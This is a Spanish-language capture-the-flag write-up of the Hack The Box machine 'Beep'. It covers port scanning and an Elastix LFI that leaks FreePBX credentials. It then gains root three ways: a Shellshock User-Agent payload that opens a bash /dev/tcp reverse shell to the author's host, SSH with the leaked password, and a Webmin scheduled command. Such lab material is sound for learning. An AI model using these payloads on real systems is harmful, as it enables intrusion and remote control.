---
title: Beep WriteUp
date: 2024-02-15
categories: [WriteUps, Máquinas Linux]
tags: [LFI, Shellshock]
image:
  path: ../../assets/img/writeups/Beep/beep.png
  width: 528
  height: 340
  alt: Banner Beep
---

¡Hola!. En esta máquina vemos un LFI, explotable gracias a una vulnerabilidad del servicio Asterix. Gracias al LFI vemos recursos interesantes con los cuales posteriormente explotar la máquina de varias formas; una desde dentro del servicio webmin y otra con una ataque shellshock.

## Reconocimiento

¡Buenos días, buenas tardes, buenas noches!. Hoy intentaré hackear la máquina **Beep**. La IP de la máquina es **10.10.10.7**.

Empezaré haciendo un ping a esa IP -antes de esto tienes que conectarte a la VPN proporcionada por HTB con el comando `openvpn <namevpn>.ovpn` para comprobar que tengo conectividad con ella.

```sh
❯ ping -c 1 10.10.10.7
PING 10.10.10.7 (10.10.10.7) 56(84) bytes of data.
64 bytes from 10.10.10.7: icmp_seq=1 ttl=63 time=42.4 ms

--- 10.10.10.7 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.380/42.380/42.380/0.000 ms
```

Y si, hay conectividad, ya que hemos transmitido un paquete y hemos recibido un paquete de vuelta. El ttl es 63, al estar cercano a 64 podemos suponer bien que nos encontramos ante una máquina **Linux**.

Lo próximo a realizar es un escaner de los puertos de la máquina. Recomiendo que las salidas de los siguienes comandos sean guardadas de manera organizada, en el caso que que hagáis la máquina vosotras.

```sh
❯ nmap 10.10.10.7 -p- -sS --min-rate 5000 -n -Pn -vvv -oN ports
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-15 15:39 CET
Initiating SYN Stealth Scan at 15:39
Scanning 10.10.10.7 [65535 ports]
Discovered open port 143/tcp on 10.10.10.7
Discovered open port 80/tcp on 10.10.10.7
... SNIP .....
Completed SYN Stealth Scan at 15:39, 11.33s elapsed (65535 total ports)
Nmap scan report for 10.10.10.7
Host is up, received user-set (0.041s latency).
Scanned at 2024-02-15 15:39:20 CET for 11s
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 63
25/tcp    open  smtp             syn-ack ttl 63
80/tcp    open  http             syn-ack ttl 63
110/tcp   open  pop3             syn-ack ttl 63
111/tcp   open  rpcbind          syn-ack ttl 63
143/tcp   open  imap             syn-ack ttl 63
443/tcp   open  https            syn-ack ttl 63
793/tcp   open  unknown          syn-ack ttl 63
993/tcp   open  imaps            syn-ack ttl 63
995/tcp   open  pop3s            syn-ack ttl 63
3306/tcp  open  mysql            syn-ack ttl 63
4190/tcp  open  sieve            syn-ack ttl 63
4445/tcp  open  upnotifyp        syn-ack ttl 63
4559/tcp  open  hylafax          syn-ack ttl 63
5038/tcp  open  unknown          syn-ack ttl 63
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.39 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
```


| Options | Description |
| --- | --- |
| **-p** | Escanea todos los puertos. Hay un total de 65535 puertos |
| **-sS** | Realiza un TCP SYN Scan |
| **--min-rate** | Para enviar paquetes no más lentos que, en este caso, 5000 paquetes por segundo |
| **-n** | Para no aplicar resolución DNS |
| **-Pn** | Para que no haga host discovery |
| **-vvv** | Muestra la información en pantalla mientras se realiza el escaneo |
| **-oN** | Output se guardará en el formato Nmap |


Ahora analizaré más en profundidad con una serie de scripts por defecto (**-sC**) y buscando la versión de cada servicio (**-sV**) los puertos encontrados.

```sh
❯ nmap 10.10.10.7 -p22,25,80,110,111,143,443,793,993,995,3306,4190,4445,4559,5038,10000 -sC -sV -oN services
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-15 16:24 CET

Nmap scan report for 10.10.10.7
Host is up (0.040s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 adee5abb6937fb27afb83072a0f96f53 (DSA)
|_  2048 bcc6735913a18a4b550750f6651d6d0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.10.10.7/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: APOP LOGIN-DELAY(0) TOP IMPLEMENTATION(Cyrus POP3 server v2) UIDL USER PIPELINING AUTH-RESP-CODE RESP-CODES STLS EXPIRE(NEVER)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            790/udp   status
|_  100024  1            793/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: LITERAL+ Completed UNSELECT RENAME MAILBOX-REFERRALS RIGHTS=kxte CHILDREN URLAUTHA0001 ACL ANNOTATEMORE IMAP4rev1 IDLE X-NETSCAPE LIST-SUBSCRIBED STARTTLS LISTEXT CONDSTORE ID CATENATE NO NAMESPACE UIDPLUS THREAD=REFERENCES IMAP4 MULTIAPPEND THREAD=ORDEREDSUBJECT SORT=MODSEQ QUOTA SORT ATOMIC BINARY OK
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2024-02-15T15:27:41+00:00; +3s from scanner time.
793/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 393.73 seconds
```

Cuando hay bastantes puertos abiertos con sus respectivos servicios **cuesta decidirse por donde empezar. Simplemente empieza, y poco a poco**. Lo más simple a partir de ahora es averiguar si las diferentes versiones tienen vulnerabilidades públicas.

## Buscando vulnerabilidades

Miré a través del comando `searchsploit` y de Google las diferentes versiones pero no me resultaron interesantes como para empezar a probar cosas con ellas. Sobretodo me llamo la atención el servicio **Asterisk Call Manager** ya que la máquina se llama Beep, en inglés pitido. También me llamo la atención el servicio de fax **HylaFAX**. Ninguno de los dos tiene exploits que me llamen la atención.

Quiero empezar con los servicios web lanzando un whatweb tanto al puerto **80** como al puerto **443**.

```sh
❯ whatweb http://10.10.10.7:80
http://10.10.10.7:80 [302 Found] Apache[2.2.3], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.2.3 (CentOS)], IP[10.10.10.7], RedirectLocation[https://10.10.10.7/], Title[302 Found]
ERROR Opening: https://10.10.10.7/ - SSL_connect returned=1 errno=0 state=error: dh key too small

❯ whatweb https://10.10.10.7:443
ERROR Opening: https://10.10.10.7:443 - SSL_connect returned=1 errno=0 state=error: dh key too small
```
Si voy al navegador para ver cual es el problema, parece que el certificado de la máquina ha caducado. Este es el fallo:

```plaintext
Error code: SSL_ERROR_UNSUPPORTED_VERSION

    The page you are trying to view cannot be shown because the authenticity of the received data could not be verified.
    Please contact the website owners to inform them of this problem.

This website might not support the TLS 1.2 protocol, which is the minimum version supported by Firefox.
```

Para solucionarlo dentro de firefox en la barra de búsqueda; `about:config`, y cambiar estas configuraciones:

```plaintext
security.tls.version.enable-deprecated ---> true
security.tls.version.min --> 1

# Por defecto estaba en false, y 3, respectivamente. Recuerda volver a cambiar al acabar la máquina.
```

Ahora si intento entrar a la web por el puerto 443, y acepto la ventana del riesgo, consigo ver una panel de inicio de sesión del servicio llamado **elastix**:

![Web]({{ 'assets/img/writeups/Beep/web.png' | relative_url }}){: .center-image }

Si buscamos con **searchsploit** por elastix tenemos varios resultados.

```sh
❯ searchsploit elastix
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                                                 | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                               | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                         | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                      | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                                                     | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                                    | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                | php/webapps/18650.py
```

### Local File Inclusión

Estaría bien averiguar la versión, y si no siempre se puede ir probando cada exploit. Si no encontrará la versión la que probaría antes seguramente sería la de Local File Inclusion ya que es una vulnerabilidad sencilla de probar, y si funciona seguramente sea esa la versión.

Miro en la página fuente y no veo la versión. Podría buscar el programa por internet y si es de código abierto quizás averiguar alguna ruta donde pueda salir la versión, no lo hacer.  
Pruebo algunas credenciales por defecto de elastix, recogidas por internet como; admin:palosanto, admin:admin, admin:password, pero nada.

Echaré un vistazo al exploit del Local File Inclusión; `searchsploit -x 37637`. Parece que el LFI está en la siguiente ruta:

```plaintext
...SNIP ...
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
... SNIP ....
```

Simplemente copio esa ruta y la pego después de la IP objetivo y comprobar que funciona:

```plaintext
# En la URL del navegador:
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

Y funciona, tenemos **LFI** y la versión del Elastix debe ser la **2.2.0**. Abrimos la página fuente de la página para ver mejor ese amportal.conf. Vemos cositas:

```plaintext
.. SNIP ...
# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

# AMPBIN: Location of the FreePBX command line scripts
# AMPSBIN: Location of (root) command line scripts
#
AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin

# AMPWEBROOT: Path to Apache's webroot (leave off trailing slash)
# AMPCGIBIN: Path to Apache's cgi-bin dir (leave off trailing slash)
# AMPWEBADDRESS: The IP address or host name used to access the AMP web admin
#
AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin 
# AMPWEBADDRESS=x.x.x.x|hostname

# FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
# FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
# FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
# or if you don't want FOP.
#
#FOPRUN=true
FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

.... SNIP ....

# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
ARI_ADMIN_USERNAME=admin

# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE

... SNIP ...

AMPDBNAME=asterisk

ASTETCDIR=/etc/asterisk
ASTMODDIR=/usr/lib/asterisk/modules
ASTVARLIBDIR=/var/lib/asterisk
ASTAGIDIR=/var/lib/asterisk/agi-bin
ASTSPOOLDIR=/var/spool/asterisk
ASTRUNDIR=/var/run/asterisk
ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
```

Bastante información. Primero entendamos. Lo primero que vemos es **FreePBX** database, recogiendo algo de info:

```plaintext
FreePBX es una GUI de código abierto basado en Web que controla y dirige Asterisk, un servidor de VoIP.​ FreePBX está licenciado bajo la GNU General Public License​​ y es un componente del FreePBX Distro; También se incluye como una pieza clave de otras distribuciones como Elastix, Trixbox y AsteriskNOW
```
Parece que FreePBX se relaciona con el servicio Asterisk también, que vimos abierto en el escaneo de puertos, en el puerto 5038. Muy bien, vamos relacionando. Recuerda que la máquina se llama Beep que en inglés es pitido.

Además del archivo amportal.conf recogemos varias credenciales y rutas. Parece que FreepPBX database es una base de datos Mysql; *AMPDBENGINE: Engine hosting the FreePBX database*. Y más abajo; *AMPDBENGINE=mysql*. Recuerdo que teníamos el puerto 3306 abierto.

También parece que hay una interfaz de asterisk; *AMPMGRUSER: Username to access the Asterisk Manager Interface*. Si intento entrar desde el navegador; **https://10.10.10.7:5038** me da el siguiente fallo; *Error code: SSL_ERROR_RX_RECORD_TOO_LONG*. Buscando soluciones por internet parece que se puede solucionar accediendo con el protocolo **http**. Y si, parece que se intenta cargar algo pero ahí se queda, continuamente cargando.

Otra cosa interesante es la ruta **/var/www/cgi-bin**, con lo que podríamos intentar realizar un **shellshock attack**.  
También tenemos un ruta de log; **/var/log/asteriskSorry!**.  
Y unas credenciales para lo que parece un Flash Operator Panel en la ruta **/var/www/html/panel/**, en la cual no hay nada. Existe pero sale en blanco.

Y todo eso, en principio, es lo que saco en claro el archivo amportal.conf recogido gracias al la vulnerabilidad LFI de este servicio Elastix 2.2.0.

¿Qué cosas puedo hacer?

- Seguir con el LFI, visualizando más archivos (/etc/passwd, id_rsa, etc).
- Buscar subidrectorios y archivos con wfuzz, gobuster, etc.
- Conectarme al servicio Asterisk de alguna forma con las credenciales recogidas.
- Conectarme a la base de datos por el puerto 3306 con las credenciales recogidas.
- Intentar un shellshock attack.
- Intentar un log poisoning gracias al LFI y esa ruta de log; */var/log/asteriskSorry!*.


Primero seguiré con el LFI, para consultar sobre ello puedo ir a mis notas de obsidian -vosotros no- o mi github público por [aquí](https://guiseporaki.github.io/posts/Hacking-Web/#lfi---local-file-inclusion).  
El primer archivo que busco es el **/etc/passwd**, cambio amposta.conf en la URL por ese archivo; `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`:

```plaintext
root:x:0:0:root:/root:/bin/bash
... SNIP ....
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
Sorry! Attempt to access restricted file.
```

Ahora intentaré capturar el archivo **id_rsa** del usuario **fanis** o del usuario **smapfilter**. Para */home/fanis/.ssh/id_rsa/* no sale nada, lo mismo para el usuario spamfilter. -Siempre buscamos usuarios que esten en la carpeta /home-.  
La ruta de log vista antes; */var/log/asteriskSorry!* tampoco carga. Ni tampoco la típica de los logs de Apache; */var/log/apache2/access.log*.

### Buscando subdirectorios y archivos

Buscaré subdirectorios y archivos de la web con **gobuster**:

```sh
❯ gobuster dir -u https://10.10.10.7 -w /opt/SecLists/Discovery/Web-Content/common.txt -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.7
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2024/02/17 09:29:01 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 282]
/.htaccess            (Status: 403) [Size: 287]
/.htpasswd            (Status: 403) [Size: 287]
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
/cgi-bin/             (Status: 403) [Size: 286]                                
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
/favicon.ico          (Status: 200) [Size: 894]                                  
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]   
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/] 
/index.php            (Status: 200) [Size: 1785]                                 
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]   
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]   
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]   
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]  
/robots.txt           (Status: 200) [Size: 28]                                   
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/] 
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/] 
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]   
```

Si voy al direcotrio **admin**; `https://10.10.10.7/admin/` nos sale una ventana emergente para iniciar sesión como administrador, si fallas te muestra que es para el servicio de FreePBX. Vimos credenciales antes en el archivo amposta.conf; **admin:jEhdIekWmdjE**. Conseguimos entrar al panel de admin de este servicio:

![freePBX]({{ 'assets/img/writeups/Beep/freePBX.png' | relative_url }}){: .center-image }

Como podemos ver arriba a la izquierda en la captura la versión es la **2.8.1.4**. Buscando mediante **searchsploit** exploits para este servicio encontramos cosillas:

```sh
❯ searchsploit freepbx 2.8.1.4
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
FreePBX < 13.0.188 - Remote Command Execution (Metasploit)                                                                                            | php/remote/40434.rb
Freepbx < 2.11.1.5 - Remote Code Execution                                                                                                            | php/webapps/41005.txt
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Puedes verlo con `searchsploit -x 41005` o desde la página de **exploits-db**, dejo por [aquí](https://www.exploit-db.com/exploits/41005), es añadiendo a la URL */exploits/41005* o mejor buscando por *CVE*. Probé buscando por 41005 pero nada. Como dije si que funciona si buscas por el CVE, en el buscador; **2014-7235**.  
No llego a entender muy bien el exploit, es decir, por la descripción sé que se aprovecha de una mala configuración en la entrada de la cookie **ari_auth** pero no entiendo en que punto ejecuta el comando. Como no lo entiendo muy bin intentaré otra cosa antes.

Vi antes una **carpeta cgi-bin** así que podría perfectamente ser vulnerable a un ataque **ShellShock**. Dejo por [aquí](https://guiseporaki.github.io/posts/Vulnerabilidades-2/) más información, en el apartado Shellsock se encuentra.  
Primero hay que encontrar un programa dentro de esa carpeta para ejecutarlo - de ahí que busquemos por extensiones .sh, .pl, .cgi-. Con gobuster mejor añadir una barra al final del directorio o añadir la opción **--add-slash**.

```sh
❯ gobuster dir -u https://10.10.10.7/cgi-bin -w /opt/SecLists/Discovery/Web-Content/common.txt -k -x pl,sh,cgi -t 30 --add-slash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.7/cgi-bin
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,cgi,pl
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2024/02/17 11:38:49 Starting gobuster in directory enumeration mode
===============================================================
/.hta/                (Status: 403) [Size: 291]
/.htaccess/           (Status: 403) [Size: 296]
/.htpasswd.cgi        (Status: 403) [Size: 299]
/.hta.sh              (Status: 403) [Size: 293]
/.htaccess.pl         (Status: 403) [Size: 298]
/.htpasswd/           (Status: 403) [Size: 296]
/.hta.cgi             (Status: 403) [Size: 294]
... SNIP ...
```

Parece que está programado para que todo que empieze por esos nombres (.htb, .htaccess, etc) devuelva el código de estado **403** o **Forbidden**. No descubre más archivos. Olvidemos esta parte y probemos otra cosa.

Si entro al puerto **10000** que descubrimos por nmap desde el navegador; `https://10.10.10.7:10000` tenemos una panel del servicio **Webmin**. Webmin es una herramienta de configuración de sistemas accesible vía web para sistemas Unix, como GNU/Linux y OpenSolaris. Con él se pueden configurar aspectos internos de muchos sistemas libres, como el servidor web Apache, PHP, MySQL, DNS, Samba, DHCP, entre otros.  

![Webmin]({{ 'assets/img/writeups/Beep/webmin.png' | relative_url }}){: .center-image }

Si probamos cualquier credencial inválida, por ejemplo admin:admin parece que hay una solicitud a la ruta `https://10.10.10.7:10000/session_login.cgi` -se muestra en la URL-. Ahora si, con ese .cgi podríamos probar un shellshock.

Otra vía de explotación es probar las credenciales que hemos recogido del archivo amposta.conf en el panel de webmin. Además este servicio suele tener las mismas contraseñas que por **ssh**.

## Tres tipos de Explotación

### Explotación vía Shellshock

Pongamos cualquier credencial inválida y pasemos la petición por Burpsuite. Click a "Forward" varias veces por el tema de la advertencia de peligro.  
Ahora es cuando efectuaremos el ataque shellsock -El concepto de ShellShock attack consiste en el uso de la vulnerabilidad en el Shell bash- y se realiza mediante la manipulación de la cabecera **User-Agent** en el caso. Esta es la petición interceptada con Burpsuite -la mando al repeater-:

```plaintext
POST /session_login.cgi HTTP/1.1
Host: 10.10.10.7:10000
Cookie: testing=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.10.10.7:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://10.10.10.7:10000
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

page=%2F&user=admin&pass=admin
```

Y la vulnerabilidad seguiría esta estructura en la cabecera:

```sh
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
# /bin/eject te extrae la disquetera. Pero claro..usaríamos otro comando
```

Podríamos lanzarnos el output del comando whoami a nuestra IP con netcat; `whoami | nc 10.10.14.23 443`. Me pongo en escucha con netcal; `nc -nlvp 443`. 

```plaintext
POST /session_login.cgi HTTP/1.1
Host: 10.10.10.7:10000
Cookie: testing=1
User-Agent: () { :; }; whoami | nc 10.10.14.23 443
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.10.10.7:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
... SNIP ...

page=%2F&user=admin&pass=admin
```

Y nos llega por el **nc**:

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.7] 50466
root
```

Ahora podríamos lanzarnos una reverse. Escribiré la siguiente línea de reverse shell en bash; `bash -i >& /dev/tcp/10.10.14.23/443 0>&1`. No hará falta el *bash -c* porque se supone que ya ejecuta el comando desde bash/shell (shellsock). Y me pondré en escucha claro.

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
```

Y añado la reverse en el *User-Agent* en solicitud del Burpsuite:

```plaintext
POST /session_login.cgi HTTP/1.1
Host: 10.10.10.7:10000
Cookie: testing=1
User-Agent: () { :; }; bash -i >& /dev/tcp/10.10.14.23/443 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.10.10.7:10000/session_login.cgi
... SNIP ...

page=%2F&user=admin&pass=admin
```

Y estamos dentro, y como root:

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.7] 36824
bash: no job control in this shell
[root@beep webmin]# whoami
root
[root@beep webmin]#
```

En este punto podemos hacer el tratamiento o coger las flagas ya -pongo asteriscos en el valor de las flags para que nadie copie-:

```sh
[root@beep webmin]# cd /home
[root@beep home]# ls
fanis
spamfilter
[root@beep home]# cd fanis
[root@beep fanis]# ls
user.txt
[root@beep fanis]# cat user.txt
bccba9c97f21b9455098*****
[root@beep fanis]# cat /root/root.txt   
ad6ef199cb2d70ed9dd0*******
[root@beep fanis]#
```
Esta sería la forma de explotar la caja mediante **shellshock**.

### Explotación vía conexión por ssh

Probando credenciales en el panel de Webmin -las credenciales recogidas de amposta.conf- entramos con **root:jEhdIekWmdjE**. Si intentamos entrar por ssh a la máquina objetivo:

```sh
❯ ssh root@10.10.10.7
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

Buscando un poco por internet parece que se soluciona así:

```sh
❯ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7

The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# 
```
Y, por supuesto, entramos como root también.

### Vía desde dentro de Webmin

Podemos acceder creando comandos o tareas programanas desde Wwbmin. Como somos el usuario root no tendremos restricciones.  
Para ello voy a System --> Sheduled Commands (prefiero usar un comando). Lo configuro para que se ejecute dos minutos después, que lo haga el usuario root, y dispongo este comando; ` 	bash -i &> /dev/tcp/10.10.14.23/443 0<&1`.

En el tiempo establecido me llega la reverse, también como root:

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.7] 49695
bash: no job control in this shell
[root@beep /]# whoami
root
```

Hemos visto 3 vías para hacernos con la caja **Beep**. Ha estado guay.




















